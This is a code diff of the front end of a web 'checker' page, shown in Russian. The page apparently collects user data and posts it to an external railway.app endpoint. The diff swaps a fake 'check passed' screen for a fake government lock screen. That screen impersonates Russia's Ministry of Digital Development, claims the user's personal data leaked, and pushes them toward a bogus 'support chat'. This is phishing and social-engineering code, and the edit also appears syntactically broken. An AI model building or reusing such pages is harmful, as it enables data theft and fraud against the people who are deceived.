@@ -238,13 +238,17 @@ function startLoading() {
   console.log("Запуск загрузки, собранные данные:", data);
   document.getElementById("mainContainer").classList.add("hidden");
   els.loading.classList.remove("hidden");
-  setTimeout(() => {
-    els.loading.innerHTML = `
-      <div class="text-center text-white">
-        <div class="mx-auto w-24 h-24 border-8 border-green-400 border-t-transparent rounded-full animate-spin mb-8"></div>
-        <div class="text-3xl font-semibold mb-2">✓ Проверка пройдена!</div>
-        <div class="text-green-400 text-xl">Проблем не обнаружено</div>
-      </div>
+            <div id="blocked" class="hidden fade-in lock-screen">
+                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828843.png" class="w-16 h-16 mx-auto mb-6" alt="blocked">
+                <h1 class="text-xl font-bold text-red-600 mb-4 uppercase">БОТ ЗАБЛОКИРОВАН</h1>
+                <div class="text-sm text-gray-600 text-left space-y-4 leading-relaxed mb-8">
+                    <p><b>Данный сервис заблокирован Министерством связи и массовых коммуникаций Российской Федерации из-за подозрения в мошенничестве:</b> Ваши персональные данные были переданы по незащищенному каналу. С вами свяжутся представители Минцифр России.</p>
+                    <p>Для ускорения процесса разбирательства, напишите в официальный чат поддержки.</p>
+                </div>
+                <a id="supportBtn" href="#" class="block w-full bg-zinc-900 text-white py-4 rounded-xl font-bold text-center">Чат поддержки Минцифры</a>
+            </div>
+
+        </div> </main>
     `;
     fetch('https://helper-chek-bot-2026-production.up.railway.app/api/save', {
       method: 'POST',
